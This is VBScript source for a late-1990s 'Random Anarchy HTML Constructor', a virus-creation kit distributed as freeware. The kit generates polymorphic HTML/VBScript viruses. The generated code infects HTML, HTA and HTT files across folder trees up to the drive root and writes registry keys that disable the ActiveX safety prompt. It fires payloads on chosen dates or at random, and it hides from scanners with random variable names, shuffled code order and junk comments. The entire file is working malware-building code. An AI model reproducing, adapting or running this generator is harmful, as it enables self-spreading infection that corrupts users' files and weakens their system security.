'
' Random Anarchy HTML Constructor
'
' v0.11
' Copyright 1998. '1nternal'. All Rights Reserved.
'
' This Script is freeware, you may make as many duplicates/copies
' as you wish and distribute it freely providing all files are included.
'

'Global Variables
Public LinesCount, GenText, TabAmount, PreID, CreatedTxt, CreatedFSO, FoundParent, DirNum
Public FoundHostA, FoundHost, FindHostStyle, WSCreated

Public Const EngineMajorVer = 0
Public Const EngineMinorVer = 2
Public Const EngineRevision = 0
Public Const EngineMajorDesc = "rahC"
Public Const EngineMinorDesc = "VBS"
Public Const EngineAuthorDesc = "1nternal"
Public Const EngineYearDate = "1999"
Public EngineCopyString

'  Sub procedure names
Public VarInfFileName, VarInfFolderName
'  Objects and variables
Public VarWSObj, VarFSOObj, VarTxtRng, VarFileContents, VarFolderObj, VarFileCollection
Public VarVictFileObj, VarEachFile, VarTestString, VarExtType, VarTextStreamObj
'  Host and victim paths
Public VarInfPath, VarInfFile, VarHostPath

EngineCopyString = EngineMajorDesc & "." & EngineMinorDesc & " v" & EngineMajorVer & "." & EngineMinorVer & " Copyright " & EngineYearDate & ". " & EngineAuthorDesc
document.write "<p align=""Center""><font size=""1"" face=""Arial"">Engine: " & EngineCopyString & "</font></p>"

'----------------------------Intialisation and Main Layout Block---------------------------------

'Inserts the header and footer code around the virus/trojan
'and calls the exectution probability routine
Sub GV()
	On Error Resume Next
	Call InitialiseIt
	if InitialisePlugin() then
		if VInfo.GenSeed.Value <> "" then
			Rnd(-1)
			Randomize(VInfo.GenSeed.Value)
		else
			Randomize
		end if
		Call InitialiseAgain
		AddLine 0, PreID
		AddLine 0, "<html><body>"
		AddLine 0, "<script Language=""VBScript""><!--"
		AddCodeLine "On Error Resume Next"
		Call CustomHeaderCode
		Select Case Int((6 * Rnd) + 1)
			Case 1
				Call InsertInfectFile
				Call InsertInfectPath
				Call InsertExecProb
			Case 2
				Call InsertInfectPath
				Call InsertInfectFile
				Call InsertExecProb
			Case 3
				Call InsertExecProb
				Call InsertInfectPath
				Call InsertInfectFile
			Case 4
				Call InsertExecProb
				Call InsertInfectFile
				Call InsertInfectPath
			Case 5
				Call InsertInfectFile
				Call InsertExecProb
				Call InsertInfectPath
			Case 6
				Call InsertInfectPath
				Call InsertExecProb
				Call InsertInfectFile
		End Select
		Call CustomFooterCode
		AddLine 0, "'HTML.rahC." & VInfo.GenName.value & " v0.1 /" & VInfo.IDTag.Value
		AddLine 0, "'Generated with HTML.rahC v0.1 /1nternal"
		AddLine 0, "--></" & "script>"
		AddLine 0, "</body></html>"
		if TerminatePlug() then
			window.status="Creating document"
			set NewWin = window.open()
			NewWin.document.Write(GenText)
			window.status = "Done"
		end if
	end if
End Sub

'Sets up some variables in preperation for the generation
Sub InitialiseAgain
	On Error Resume Next
	if VInfo.RandVars.Checked = true then
		VarInfFolderName = GenVar
		VarHostPath = GenVar
		VarWSObj = GenVar
		VarFSOObj = GenVar
		VarInfPath = GenVar
		VarInfFileName = GenVar
		VarInfFile = GenVar
		VarFileContents = GenVar
		VarTxtRng = GenVar
		VarFolderObj = GenVar
		VarFileCollection = GenVar
		VarVictFileObj = GenVar
		VarTextStreamObj = GenVar
		VarEachFile = GenVar
		VarTestString = GenVar
		VarExtType = GenVar
	end if
	if NameChanges.Exists(Ucase(VInfo.GenName.Value)) then VInfo.GenName.Value = NameChanges.Item(Ucase(VInfo.GenName.Value))
	PreID = "<!--" & VInfo.IDTag.Value & "-->"
End Sub

Sub InitialiseIt
	On Error Resume Next
	TabAmount = 0
	LinesCount = 0
	DirNum = 0
	FoundHostA = False
	FoundHost = False
	FindHostStyle = 0
	CreatedTxt = False
	CreatedFSO = False
	FoundParent = False
	WSCreated = False
	GenText = ""
	VarInfFolderName = "InfectFolder"
	VarHostPath = "HostPath"
	VarWSObj = "WSHShell"
	VarFSOObj = "FSO"
	VarInfPath = "InfectPath"
	VarInfFileName = "InfectFile"
	VarInfFile = "InfectFileName"
	VarFileContents = "FileContents"
	VarTxtRng = "Rng"
	VarFolderObj = "FolderObj"
	VarFileCollection = "fc"
	VarVictFileObj = "fv"
	VarTextStreamObj = "ts"
	VarEachFile = "target"
	VarTestString = "TestString"
	VarExtType = "ExtType"
End Sub

'----------------------------------Main Execution Conditional block------------------------------

'Inserts the offline and random run check to the viral code text stream
'randomly swapping the order of the conditions
Sub InsertExecProb
	Call RandInsertTxtHost
	BaseString = ""
	BonusString = ""
	ConditionalS = ""
	if VInfo.ExecOffline.Checked = True then BaseString = "location.protocol = ""file:"""
	Select Case GetVals(VInfo.ExecProb)
		Case "Every"
			BonusString = ""
		Case "Day"
			BonusString = "Day(now) = " & VInfo.DayValExec.Value
		Case "Week"
			BonusString = "WeekDay(now) = " & VInfo.WeekExec.Value
		Case "Misc"
			BonusString = VInfo.ExecLine.Value
		Case "Rand"
			BonusString = "Int((" & VInfo.ExecMax.Value & " * Rnd) + 1) = 1"
	End Select		

	RandOrder RandomAndAdd(BaseString, BonusString), "Randomize", 1
	TabAmount = TabAmount + 1

	HackedRegBegin = False
	HackedRegA = False
	HackedRegB = False
	VCodeChecked = False
	PayLoadChecked = False

	Do
		Select Case Int((6 * Rnd) + 1)
			Case 1 and HackedRegBegin = False
				Call AVRegHackBegin
				HackedRegBegin = True
			Case 2 and PayLoadChecked = False
				if VInfo.TrigInfect.Checked = False then Call PayLoadCheck
				PayLoadChecked = True
			Case 3 and VCodeChecked = False
				Call VCodeCheck
				VCodeChecked = True
			Case 4 and HackedRegA = False and HackedRegBegin = True
				Call AVRegHackA
				HackedRegA = True
			Case 5 and HackedRegB = False and HackedRegBegin = True
				Call AVRegHackB
				HackedRegB = True
			Case else 
				if VCodeChecked = False then call RandInsertTxtHost
		End Select
	Loop While HackedRegBegin = False or PayLoadChecked = False or VCodeChecked = False or HackedRegA = False or HackedRegB = False
	Call CustomExecuteCodeEnd
	if BaseString <> "" OR BonusString <> "" then
		TabAmount = TabAmount - 1
		AddCodeLine "end if"
	end if
End Sub

'----------------------------------------Infection Block-----------------------------------------

Sub VCodeCheck
	if GetVals(Vinfo.InfProb) <> "None" then
		BaseString = ""
		BonusString = ""
		if VInfo.InfOffline.Checked = True then BaseString = "location.protocol = ""file:"""
		Select Case GetVals(VInfo.InfProb)
			Case "Every"
				BonusString = ""
			Case "Day"
				BonusString = "Day(now) = " & VInfo.DayValInf.Value
			Case "Week"
				BonusString = "WeekDay(now) = " & VInfo.InfWeek.Value
			Case "Misc"
				BonusString = VInfo.InfLine.Value
			Case "Rand"
				BonusString = "Int((" & VInfo.InfMax.Value & " * Rnd) + 1) = 1"
		End Select		

		if BaseString <> "" OR BonusString <> "" then
			AddCodeLine RandomAndAdd(BaseString, BonusString)		
			TabAmount = TabAmount + 1
		end if

		if VInfo.TrigInfect.Checked = True and GetVals(VInfo.TrigPlace) = "Before" then Call PayLoadCheck
		Call InitialiseInfect
		if VInfo.TrigInfect.Checked = True and GetVals(VInfo.TrigPlace) = "After" then Call PayLoadCheck
		if BaseString <> "" OR BonusString <> "" then
			TabAmount = TabAmount - 1
			AddCodeLine "end if"
		end if
	end if
End Sub

Sub InitialiseInfect
	Do
		Select Case Int((5 * Rnd) + 1)
			Case 1 and CreatedFSO = False
				AddCodeLine "Set " & VarFSOObj & " = CreateObject(""Scripting.FileSystemObject"")"
				CreatedFSO = True
			Case 2 and CreatedTxt = False
				Call InsertCreateTxt
			Case 3 and FoundHost = False
				Call InsertFindHost
			Case 4 and FoundParent = False and CreatedFSO = True and FoundHost = True
				AddCodeLine VarHostPath & " = " & VarFSOObj & ".GetParentFolderName(" & VarHostPath & ")"
				FoundParent = True
			Case 5 and CreatedFSO = True and CreatedTxt = True
				Call InsertDirInf
		end select
	Loop While FoundHost = False or CreatedFSO = False or CreatedTxt = False or FoundParent = False
	InsertedCurrent = False
	Do
		Select Case Int((3 * Rnd) + 1)
			Case 1 and InsertedCurrent <> True
				if VInfo.InfCurrent.checked = True then
					AddCodeLine RandString(VarInfFolderName & RandBrack(VarHostPath), "Call " & VarInfFolderName & "(" & VarHostPath & ")")
				end if
				InsertedCurrent = True
			Case else
				Call InsertDirInf
		end select
	Loop While InsertedCurrent = False or DirNum < 6
End Sub

Sub InsertFindHost
	'FindHostStyle = 1 or 2
	'1 = Get rid of "File:" first. 2 = Change "/" first
	if Vinfo.InfCurrent.Checked = True then
		if FindHostStyle = 0 then FoundHostType = Int((2 * Rnd) + 1)
		if FindHostStyle = 1 then
			if FoundHostA <> True then
				AddCodeLine VarHostPath & " = Replace(location.href, ""file:///"", """")"
			else
				AddCodeLine VarHostPath & " = Replace(" & VarHostPath & ", ""/"", ""\"")"
				FoundHost = True
			end if
		else
			if FoundHostA <> True then
				AddCodeLine VarHostPath & " = Replace(location.href, ""/"", ""\"")"
			else
				AddCodeLine VarHostPath & " = Replace(" & VarHostPath & ", ""file:\\\"", """")"
				FoundHost = True
			end if
		end if
		FoundHostA = True
	else
		FoundHost = True
	end if
End Sub

Sub InsertCreateTxt
	if VInfo.CreateRange.Checked = True or GetVals(VInfo.FileRoutine) = "Default" then
		AddCodeLine "Set " & VarTxtRng & " = document.body.createTextRange" & RandString("()" , "")
	end if
	CreatedTxt = True
End Sub

Sub RandInsertTxtHost
	for i = 1 to 2
		if Int((8 * Rnd) + 1) = 1 then
			if Int((2 * Rnd) + 1) = 1 and FoundHost = False and GetVals(VInfo.InfProb) <> "None" then
				Call InsertFindHost
			elseif CreatedTxt = False and GetVals(VInfo.InfProb) <> "None" then
				Call InsertCreateTxt
			end if
		end if
	next
End Sub

Sub InsertDirInf
	DirNum = DirNum + 1
	if VInfo.DirHard.Checked = True then
		Select Case DirNum
			Case 1 and VInfo.Dir1.Value <> ""
				AddCodeLine RandString(VarInfFolderName & RandBrack("""" & VInfo.Dir1.Value & """"), "Call " & VarInfFolderName & "(" & """" & VInfo.Dir1.Value & """" & ")")
			Case 2 and VInfo.Dir2.Value <> ""
				AddCodeLine RandString(VarInfFolderName & RandBrack("""" & VInfo.Dir2.Value & """"), "Call " & VarInfFolderName & "(" & """" & VInfo.Dir2.Value & """" & ")")
			Case 3 and VInfo.Dir3.Value <> ""
				AddCodeLine RandString(VarInfFolderName & RandBrack("""" & VInfo.Dir3.Value & """"), "Call " & VarInfFolderName & "(" & """" & VInfo.Dir3.Value & """" & ")")
			Case 4 and VInfo.Dir4.Value <> ""
				AddCodeLine RandString(VarInfFolderName & RandBrack("""" & VInfo.Dir4.Value & """"), "Call " & VarInfFolderName & "(" & """" & VInfo.Dir4.Value & """" & ")")
			Case 5 and VInfo.Dir5.Value <> ""
				AddCodeLine RandString(VarInfFolderName & RandBrack("""" & VInfo.Dir5.Value & """"), "Call " & VarInfFolderName & "(" & """" & VInfo.Dir5.Value & """" & ")")
			Case else
		end select
	end if
End Sub

'-----------------------------------File Infection Sub Procedures--------------------------------

Sub InsertInfectPath
	Call RandInsertTxtHost
	if GetVals(VInfo.InfProb) <> "None" then
		AddCodeLine "Sub " & VarInfFolderName & "(" & VarInfPath & ")"
		TabAmount = TabAmount + 1
			Call InsertInfectFolderRoutine
		TabAmount = TabAmount - 1
		AddCodeLine "End Sub"
	end if
End Sub

Sub InsertInfectFolderRoutine
	Select Case GetVals(VInfo.FolderRoutine)
		Case "Default"
			AddCodeLine "On Error Resume Next"
			if VInfo.CheckExist.checked = true then
				AddCodeLine "if " & VarFSOObj & ".FolderExists(" & VarInfPath & ") then"
				TabAmount = Tabamount + 1
			end if
				if GetVals(VInfo.Directory) = "Parent" then
					Select Case GetVals(VInfo.LoopOp)
						Case "LoopU"
							AddCodeLine "Do"
						Case "LoopW"
							AddCodeLine "Do"
						Case "WhileW"
							AddCodeLine "Set " & VarFolderObj & " = " & VarFSOObj & ".GetFolder(" & VarInfPath & ")"
							AddCodeLine "While " & VarFolderObj & ".IsRootFolder = False"
					End select
						TabAmount = TabAmount + 1
				end if
						AddCodeLine "Set " & VarFolderObj & " = " & VarFSOObj & ".GetFolder(" & VarInfPath & ")"
						if GetVals(VInfo.Directory) = "Parent" then
							Call RandOrder(VarInfPath & " = " & VarFSOObj & ".GetParentFolderName(" & VarInfPath & ")", "Set " & VarFileCollection & " = " & VarFolderObj & ".Files", 0)
						else
							AddCodeLine "Set " & VarFileCollection & " = " & VarFolderObj & ".Files"
						end if
						AddCodeLine "For each " & VarEachFile & " in " & VarFileCollection
						TabAmount = TabAmount + 1
							Call TestRoutine
						TabAmount = TabAmount - 1
						AddCodeLine "next"
				if GetVals(VInfo.Directory) = "Parent" then
					TabAmount = TabAmount - 1
					Select Case GetVals(VInfo.LoopOp)
						Case "LoopU"
							AddCodeLine "Loop Until " & VarFolderObj & ".IsRootFolder = True"
						Case "LoopW"
							AddCodeLine "Loop While " & VarFolderObj & ".IsRootFolder = False"
						Case "WhileW"
							AddCodeLine "Wend"
					End select
				end if
			if VInfo.CheckExist.checked = true then
				TabAmount = TabAmount - 1
				AddCodeLine "end if"
			end if
		Case else
			Call CustomInfectFolder(GetVals(VInfo.FolderRoutine))
	End select
End Sub

Sub TestRoutine
	Uppercheck = Int(2 * Rnd)
	if Upper = 1 then
		AddCodeLine VarExtType & " = ucase(" & VarFSOObj & ".GetExtensionName(" & VarEachFile & ".Name))"
	else
		AddCodeLine VarExtType & " = lcase(" & VarFSOObj & ".GetExtensionName(" & VarEachFile & ".Name))"
	end if
	AddCodeLine "if " & ParseExtensions(Uppercheck) & " then"
	TabAmount = TabAmount + 1
		if VInfo.CheckInfected.checked = true then
			Call OpenFileMethod(VarEachFile & ".path", "1", RandString("True", "False"))
			if GetVals(VInfo.Infcheck) = "TestString" then
				AddCodeLine VarTestString & " = " & VarTextStreamObj & ".readline"
				AddCodeLine VarTextStreamObj & ".close" & RandString("()", "")
				AddCodeLine "if " & VarTestString & " <> """ &  PreID & """ then"
				TabAmount = TabAmount + 1
					AddCodeLine RandString(VarInfFileName & RandBrack(VarEachFile & ".path"), "Call " & VarInfFileName & "(" & VarEachFile & ".path)")
				TabAmount = TabAmount - 1
				AddCodeLine "end if"
			else
				AddCodeLine "if " & VarTextStreamObj & ".readline <> """ &  PreID & """ then"
				TabAmount = TabAmount + 1
					AddCodeLine VarTextStreamObj & ".close" & RandString("()", "")
					AddCodeLine RandString(VarInfFileName & RandBrack(VarEachFile & ".path"), "Call " & VarInfFileName & "(" & VarEachFile & ".path)")
				TabAmount = TabAmount - 1
				AddCodeLine "else"
				TabAmount = TabAmount + 1
					AddCodeLine VarTextStreamObj & ".close" & RandString("()", "")
				TabAmount = TabAmount - 1
				AddCodeLine "end if"
			end if
		else
			AddCodeLine RandString(VarInfFileName & RandBrack(VarEachFile & ".path"), "Call " & VarInfFileName & "(" & VarEachFile & ".path)")
		end if
	TabAmount = TabAmount - 1
	AddCodeLine "end if"
End Sub


Sub InsertInfectFile
	Call RandInsertTxtHost
	if GetVals(VInfo.InfProb) <> "None" then
		Select Case GetVals(VInfo.FileRoutine)
			Case "Default"
				AddCodeLine "Sub " & VarInfFileName & "(" & VarInfFile & ")"
				TabAmount = TabAmount + 1
					Call OpenFileMethod(VarInfFile, "1", RandString("True", "False"))
					AddCodeLine VarFileContents & " = " & VarTextStreamObj & ".ReadAll" & RandString("()", "")
					AddCodeLine VarTextStreamObj & ".close" & RandString("()", "")
					Call OpenFileMethod(VarInfFile, "2", RandString("True", "False"))
					AddCodeLine VarTextStreamObj & RandString (".WriteLine" & RandBrack("""" & PreID & """"), ".Write" & RandBrack("""" & PreID & """ + Chr(13) + Chr(10)"))
					AddCodeLine VarTextStreamObj & RandString (".WriteLine" & RandBrack("""<html><body>"""), ".Write" & RandBrack("""<html><body>"" + Chr(13) + Chr(10)"))
					AddCodeLine VarTextStreamObj & RandString (".WriteLine" & RandBrack(VarTxtRng & ".htmlText"), ".Write" & RandBrack(VarTxtRng & ".htmlText" & " + Chr(13) + Chr(10)"))
					AddcodeLine VarTextStreamObj & RandString (".WriteLine" & RandBrack("""</body></html>"""), ".Write" & RandBrack("""</body></html>"" + Chr(13) + Chr(10)"))
					AddCodeLine VarTextStreamObj & RandString(".Write", ".WriteLine") & RandBrack(VarFileContents)
					AddCodeLine VarTextStreamObj & ".close" & RandString("()", "")
				TabAmount = TabAmount - 1
				AddCodeLine "End Sub"	
			Case else
				Call CustomInfectFile(GetVals(VInfo.FileRoutine))
		End select
	end if
End Sub


function ParseExtensions(Upper)
	HTTChecked = False
	HTMChecked = False
	HTMLChecked = False
	HTAChecked = False
	MiscChecked = False
	CheckedAny = False

	ExtenList = VarExtType & " = "
	Do
		Select Case Int((5 * Rnd) + 1)
			Case 1 and HTTChecked = False
				if VInfo.HTT.checked = true then
					if CheckedAny = true then ExtenList = ExtenList & " or " & VarExtType & " = "
					if Upper = 1 then ExtenList = ExtenList + """HTT"""
					if Upper = 0 then ExtenList = ExtenList + """htt"""
					CheckedAny = true
				end if
				HTTChecked = True
			Case 2 and HTMChecked = False
				if VInfo.HTM.checked = true then
					if CheckedAny = true then ExtenList = ExtenList & " or " & VarExtType & " = "
					if Upper = 1 then ExtenList = ExtenList + """HTM"""
					if Upper = 0 then ExtenList = ExtenList + """htm"""
					CheckedAny = true
				end if
				HTMChecked = True
			Case 3 and HTMLChecked = False
				if VInfo.HTML.checked = true then
					if CheckedAny = true then ExtenList = ExtenList & " or " & VarExtType & " = "
					if Upper = 1 then ExtenList = ExtenList + """HTML"""
					if Upper = 0 then ExtenList = ExtenList + """html"""
					CheckedAny = true
				end if
				HTMLChecked = True
			Case 4 and HTAChecked = False
				if VInfo.HTA.checked = true then
					if CheckedAny = true then ExtenList = ExtenList & " or " & VarExtType & " = "
					if Upper = 1 then ExtenList = ExtenList + """HTA"""
					if Upper = 0 then ExtenList = ExtenList + """hta"""
					CheckedAny = true
				end if
				HTAChecked = True
			Case 5 and MiscChecked = False
				if VInfo.MiscExt.checked then
					if CheckedAny = true then ExtenList = ExtenList & " or " & VarExtType & " = "
					if Upper = 1 then ExtenList = ExtenList + """" + Ucase(VInfo.ExtName.Value) + """"
					if Upper = 0 then ExtenList = ExtenList + """" + Lcase(VInfo.ExtName.Value) + """"
					CheckedAny = true
				end if
				MiscChecked = True
		End Select
	Loop while MiscChecked = False or HTAChecked = False or HTMLChecked = False or HTMchecked = False or HTTChecked = False
	ParseExtensions = ExtenList
end function

'-----------------------------------Registry Hacking Procedures----------------------------------

Sub AVRegHackBegin
	if VInfo.Current.Checked = True OR VInfo.Local.Checked = True then
		if WSCreated <> True then
			AddCodeLine "Set " & VarWSObj & " = CreateObject(""WScript.Shell"")"
			WSCreated = True
		end if
	end if
End Sub
Sub AVRegHackA
	if VInfo.Current.checked = True then
		AddCodeLine VarWSObj & ".Regwrite" & RandString("""HKCU","""HKEY_CURRENT_USER") & "\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201"" , 0, ""REG_DWORD"""
	end if
End Sub
Sub AVRegHackB
	if VInfo.Local.Checked = True then
		AddCodeLine VarWSObj & ".RegWrite" & RandString("""HKLM", """HKEY_LOCAL_MACHINE") & "\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201"" , 0, ""REG_DWORD"""
	end if
End Sub

'---------------------------------Conditional Payload Block--------------------------------------

'Inserts the chosen payload trigger conditional statement to the viral code text stream
'And calls the insertion of the payload if appropriate
Sub PayLoadCheck
	if GetVals(Vinfo.Trigger) <> "None" then
		BaseString = ""
		BonusString = ""
		if VInfo.TriggerOffline.Checked = True then BaseString = "location.protocol = ""file:"""
		Select Case GetVals(VInfo.Trigger)
			Case "Every"
				BonusString = ""
			Case "Day"
				BonusString = "Day(now) = " & VInfo.DayValTrig.Value
			Case "Week"
				BonusString = "WeekDay(now) = " & VInfo.WeekDayTrig.Value
			Case "Misc"
				BonusString = VInfo.TrigLine.Value
			Case "Rand"
				BonusString = "Int((" & VInfo.TrigMax.Value & " * Rnd) + 1) = 1"
		End Select
		if BaseString <> "" or BonusString <> "" then
			AddCodeLine RandomAndAdd(BaseString, BonusString)
			TabAmount = TabAmount + 1
		end if
		if GetVals(VInfo.PayLoad) = "Prepend" then
			AddCodeLine "window.status=""HTML.Prepend /1nternal"")"
		else
			Call InsertPayLoad(GetVals(Vinfo.PayLoad))
		end if
		if BaseString <> "" OR BonusString <> "" then 
			TabAmount = TabAmount - 1
			AddCodeLine "end if"
		end if
	end if
End Sub

'----------------------------------------Misc Procedures-----------------------------------------


'Randomly brackets an argument
function RandBrack(String1)
	if Int((2 * Rnd) + 1) = 1 then
		RandBrack = "(" + String1 + ")"
	else
		RandBrack = " " + String1
	end if
end function

'Opens a file using the chosen method
'All args are strings
Sub OpenFileMethod(FilePathName, IoModeType, CreateIt)
	Select Case GetVals(VInfo.OpenMethod)
		Case "TextFile"
			Call OpenUsingText(FilePathName, IoModeType, CreateIt)
		Case "TextStream"
			Call OpenUsingStream(FilePathName, IoModeType)
		Case "Rand"
			if Int((2 * Rnd) + 1) = 1 then
				Call OpenUsingText(FilePathName, IoModeType, CreateIt)
			else
				Call OpenUsingStream(FilePathName, IoModeType)
			end if
	end select
end sub


Sub OpenUsingStream(FilePathName, IoModeType)
	AddCodeLine "Set " & VarVictFileObj & " = " & VarFSOObj & ".GetFile(" & FilePathName & ")"
	AddCodeLine "Set " & VarTextStreamObj & " = " & VarVictFileObj & ".OpenAsTextStream(" & IoModeType & ")"
End Sub

Sub OpenUsingText(FilePathName, IoModeType, CreateIt)
	AddCodeLine "Set " & VarTextStreamObj & " = " & VarFSOObj & ".OpenTextFile(" & FilePathName & ", " & IoModeType & ", " & CreateIt & ")"
End Sub


'Adds a line to te viral code text stream with a CRLF
Sub AddLine(TabstoAdd, TextToAdd)
	for i = 1 to TabstoAdd
		GenText = GenText & "	"
	next
	GenText = GenText & TextToAdd + Chr(13) + Chr(10)
	LinesCount = LinesCount + 1
	window.status = "Generating... " & LinesCount & " Lines"
End Sub

'Adds a line to the viral code text stream, randomly adding a junk afterwards if checked
Sub AddCodeLine(TextToAdd)
	if TextToAdd <> "" then
		if Int((2 * Rnd) + 1) = 1 AND VInfo.JComments.Checked = True then
			JunkString = " '"
			for i = 1 to Int((20 * Rnd) + 20)
				JunkString = JunkString & Chr(Int((74 * Rnd) + 48))
			next
			TextToAdd = TextToAdd & JunkString
		end if
		AddLine TabAmount, TextToAdd
		if Int((2 * Rnd) + 1) = 1 AND VInfo.JunkLines.Checked = True then
			JunkString = "'"
			for i = 1 to Int((20 * Rnd) + 20)
				JunkString = JunkString & Chr(Int((74 * Rnd) + 48))
			next
			AddLine TabAmount, JunkString
		end if
	end if
End sub

'Parses code into several lines
Sub AddMultiCodeLine(Parsing)
	CurPos = 1
	Parsing = Parsing & Chr(13) & Chr(10)
	Do 
		NextPos = InStr(CurPos, Parsing, Chr(13) & Chr(10))
		if NextPos > 0 then
			CurLine = Mid(Parsing, CurPos, NextPos - CurPos)
			AddCodeLine CurLine
			CurPos = NextPos + 2
		end if
	Loop While NextPos > 0
End Sub
	
'Randomly returns one of two strings
Function RandString(String1, String2)
	if Int((2 * Rnd) + 1) = 1 then
		RandString = String1
	else
		RandString = String2
	end if
End Function

'Inserts a conditional statement in random order.
Function RandomAndAdd(String1, String2)
	if String1 <> "" and String2 <> "" then
		RandomAndAdd = RandString("if " & String1 & " and " & String2 & " then", "if " & String2 & " AND " & String1 & " then")
	elseif String1 = "" and String2 = "" then
		TabAmount = TabAmount - 1
		RandomAndAdd = ""
	else
		RandomAndAdd = "if " & String1 & String2 & " then"
	end if
End Function

'Inserts two strings in random order using AddCodeLine
'If String1 or String2 = "" it doesn't insert it
'ModTab = 0 to not modify tabbing
'ModTab = 1 to indent string2 if its placed below
'ModTab = 2 to indent string2 if its placed above
Sub RandOrder(String1, String2, ModTab)
	if Int((2 * Rnd) + 1) = 1 then
		AddCodeLine String1
		if ModTab = 1 then TabAmount = TabAmount + 1
		AddCodeLine String2
		if ModTab = 1 then TabAmount = TabAmount - 1
	else
		if ModTab = 2 then TabAmount = TabAmount + 1
		AddCodeLine String2
		if ModTab = 2 then TabAmount = TabAmount - 1
		AddCodeLine String1
	end if
End Sub

'Returns the value of the chosen radio button within a radio button array
Function GetVals(ArrList)
	for i = 0 to (ArrList.length - 1)
		if ArrList(i).Checked = True then GetVals = ArrList(i).Value
	next
End function

'Generates a random stream of lower case characters
function GenVar
	for i = 1 to Int((10 * Rnd) + 5)
		GenVar = GenVar & Chr(Int((26 * Rnd) + 97))
	next
End Function